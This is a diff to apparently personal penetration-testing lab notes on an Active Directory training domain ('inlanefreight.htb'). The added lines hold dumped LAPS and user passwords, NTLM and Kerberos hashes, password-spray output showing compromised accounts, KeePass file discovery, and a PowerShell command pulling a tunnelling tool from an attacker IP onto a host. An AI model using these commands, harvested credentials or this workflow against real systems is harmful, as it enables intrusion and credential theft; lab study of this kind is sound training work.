@@ -2,6 +2,7 @@ TODOS:
 - Attacking Common Services
 - Pivoting, Tunneling, and Port Forwarding
 - AD
+- AD Bloodhound
 
 
 
@@ -32,8 +33,22 @@ LAPS
 Computer: LINUX01$ Password: @e49Yh5k@MRL$J
 Computer: MS01$    Password: 7*vp5Nc8Ph7uR&
 
+
+DC01$                Password: @w%+/#Jcz(04sc
+LINUX01$             Password: @e49Yh5k@MRL$J
+MS01$                Password: 7*vp5Nc8Ph7uR&
+
+
 Administrator:AnotherC0mpl3xP4$$
 localadmin:Password99! = need to LocalAccountTokenFilterPolicy set to 1
+
+Administrator:IpreferanewP@$$
+172.16.10.5
+10.129.120.239
+dead:beef::9143:6336:1134:5db3
+carole.holmes:Y3t4n0th3rP4ssw0rd
+
+
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0660cf3453:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -68,3 +83,45 @@ MS01$:2107:aad3b435b51404eeaad3b435b51404ee:243d7081707255b55247b53aef59f9a8:::
 LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322dc502:::
 
  powershell -c Invoke-Webrequest -OutFile C:\Users\localadmin\Desktop\chisel.exe http://10.10.15.187:80/chisel.exe
+
+
+ KEEPASS_... 10.129.204.177  445    DC01             Found process "KeePass" with PID 5268 (user INLANEFREIGHT\david)
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\AppData\Roaming\KeePass\KeePass.config.xml
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\Application Data\KeePass\KeePass.config.xml
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\Documents\David-Database.kdbx
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\My Documents\David-Database.kdbx
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\AppData\Roaming\KeePass\KeePass.config.xml
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\Application Data\KeePass\KeePass.config.xml
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\Documents\Database.kdbx
+KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\My Documents\Database.kdbx
+
+S3creTSuperP4ssword
+S3creTSuperP@ssword
+S3creTSuperP@ssword
+Testingaskdfalskdf
+
+ inlanefreight.htb        dc01.inlanefreight.htb
+
+IOXIDRES... 10.129.204.146  445    WS01   Address: 172.16.10.5
+IOXIDRES... 10.129.204.146  445    WS01   Address: 10.129.204.146
+IOXIDRES... 10.129.204.146  445    WS01   Address: dead:beef::45c6:5a4e:723:f55b
+
+ WIN-0ZF1EVJKUM9$ object = CN=WIN-0ZF1EVJKUM9,CN=Computers,DC=INLANEFREIGHT,DC=HTB
+
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\carlos:Inlanefreight02!
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\nicole:Inlanefreight02!
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\linda:Password123
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\noemi:Password!
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\engels:Inlanefreight1998!
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\diana:HackingGPPlike4Pro
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\elieser:Passw0rd
+SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\peter: KDC_ERR_PREAUTH_FAILED
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01!
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\david:Password2 (Pwn3d!)
+SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\john:Password3
+
+Administrator:aes256-cts-hmac-sha1-96:f535588e917cf644294519f345f5e14c852d6ae4d9c6fbfefc54be82b84bb35c
+Administrator:aes128-cts-hmac-sha1-96:6a1b10171f2f12d7d6fbb31e1823617b
+Administrator:des-cbc-md5:b38a08d637d9e06e
